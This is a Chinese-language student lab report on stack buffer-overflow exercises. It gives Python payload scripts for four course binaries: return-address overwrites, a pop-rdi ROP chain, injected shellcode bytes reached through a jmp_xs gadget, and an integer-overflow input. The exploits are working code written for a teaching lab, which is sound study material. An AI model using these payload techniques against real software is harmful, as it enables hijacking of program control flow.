# 栈溢出攻击实验

## 题目解决思路

### Problem 1: 

#### 分析：

通过汇编代码，我发现该程序存在典型的缓冲区溢出漏洞。在func函数中，使用不安全的strcpy函数将用户输入复制到固定大小的缓冲区（仅8字节），而没有进行边界检查。当输入超过8字节时，将覆盖栈上的返回地址。攻击者可以构造特定的输入，将返回地址覆盖为目标函数func1的地址（0x401216），从而控制程序执行流。

攻击需要覆盖：

1. 缓冲区（8字节）
2. 保存的rbp（8字节）
3. 返回地址（8字节）

共24字节后，将返回地址替换为func1地址。由于程序本身未调用func1，成功执行该函数即表示攻击成功。

#### 解决方案：

编写`python`代码，文件命名为`solution1.py`
```python
import struct
payload = b""
payload += b"A" * 8 # 填充缓冲区（8字节）
payload += b"B" * 8 # 填充保存的rbp（8字节）
payload += struct.pack("<Q", 0x401216)  # 覆盖返回地址为func1的地址
with open("answer1", "wb") as f:
    f.write(payload)
```

编译指令：
```bash
python3 solution1.py
./problem1 answer1
```
#### 结果：
![](image/image1.png)

### Problem 2:

#### 分析：

该程序同样存在缓冲区溢出漏洞，但需要调用func2(0x3f8)函数并传递参数。程序中没有直接的pop rdi指令，但在地址0x4012bb处有一个pop_rdi函数，其内部包含pop rdi; ret指令（实际地址为0x4012c7）。

攻击思路：

1. 利用memcpy溢出漏洞覆盖返回地址
2. 先跳转到pop rdi gadget，设置rdi = 0x3f8
3. 然后跳转到func2函数地址0x401216

栈布局中，缓冲区（8字节）+ 保存的rbp（8字节）后，从第17字节开始构造覆盖内容。

#### 解决方案：

编写`python`代码，文件命名为`solution2.py`
```python
import struct
payload = b""
payload += b"A" * 8 # 填充缓冲区 (8字节)
payload += b"B" * 8 # 填充保存的rbp (8字节)
payload += struct.pack("<Q", 0x4012c7)  # pop rdi; ret
payload += struct.pack("<Q", 0x3f8)     # 参数: 1016 (0x3f8)
payload += struct.pack("<Q", 0x401216) # 覆盖返回地址为func2的地址
payload += b"C" * 16 # 填充到 56 字节 (memcpy 会复制 56 字节)
with open("answer2", "wb") as f:
    f.write(payload)
```

编译指令：
```bash
python3 solution2.py
./problem2 answer2
```
#### 结果：

![](image/image2.png)

### Problem 3: 

#### 分析：

该程序存在缓冲区溢出漏洞，但具有栈保护机制（__stack_chk_fail）。因此，我的关键发现是jmp_xs函数，该函数会从全局变量saved_rsp+0x10读取地址并跳转。攻击者可以利用此函数跳转到栈上的相应位置。

攻击思路：

1. 构造：mov edi, 0x72; push 0x401216; ret
2. 设置rdi = 0x72（114）
3. 将func1地址压栈
4. 通过ret跳转到func1
5. 填充缓冲区
6. 覆盖返回地址为jmp_xs函数地址（0x401334）

#### 解决方案：

编写`python`代码，文件命名为`solution3.py`
```python
import struct
payload = b"\xbf\x72\x00\x00\x00\x68\x16\x12\x40\x00\xc3"
# 填充原来的代码：mov edi, 0x72; push 0x401216; ret（11字节）
payload += b"A" * 21 # 填充缓冲区（21字节）
payload += struct.pack("<Q", 0x7fffffffdfe0) # 填充保存的rbp
payload += struct.pack("<Q", 0x401334) # 覆盖返回地址为jmp_xs的地址
payload += b"B" * 16 # 填充缓冲区（16字节）
with open("answer3", "wb") as f:
    f.write(payload)
```

编译指令：
```bash
python3 solution3.py
./problem3 answer3
```
#### 结果：

![](image/image3.png)

### Problem 4: 

#### 分析：

该程序具有栈保护机制，无法进行传统的缓冲区溢出攻击。但是我发现其存在整数溢出逻辑漏洞。在func函数中，变量local_10初始化为-2（无符号表示为0xfffffffe），循环条件使用无符号比较（jae），导致循环执行约42亿次。程序要求循环后local_18 == 1且local_c == -1。

相关数学推导：输入值x需要满足：x - 0xfffffffe = 1，解得：x = 0xffffffff = -1

因此，输入-1（无符号表示为4294967295）满足条件，触发func1调用。

#### 解决方案：

编写`python`代码，文件命名为`solution4.py`
```python
with open("answer4", "w") as f:
    f.write("hello\n")  # 第一个字符串（任意）
    f.write("world\n")  # 第二个字符串（任意）
    f.write("-1\n")     # 一定要是-1
```

编译指令：
```bash
python3 solution4.py
./problem4 < answer4
```
#### 结果：

![](image/image4.png)

## 思考与总结

通过解决这四个问题，我发现了一些信息。

1. 问题1-3：程序缺乏栈保护，允许代码执行
2. 问题4：虽然有栈保护，但存在逻辑漏洞，说明安全需要多层次防护

从基础的返回地址覆盖，到ROP链构造，再到利用现有函数跳转到shellcode，最后到整数溢出逻辑漏洞，我学习到了多种攻击技术，进一步理解了计算机内部存储栈结构内容。

## 参考资料

列出在准备报告过程中参考的所有文献、网站或其他资源，确保引用格式正确。

1. Python struct模块官方文档
2. CSAPP课本相关部分，老师的ppt
3. AI模型帮助（DeepSeek、Gemini）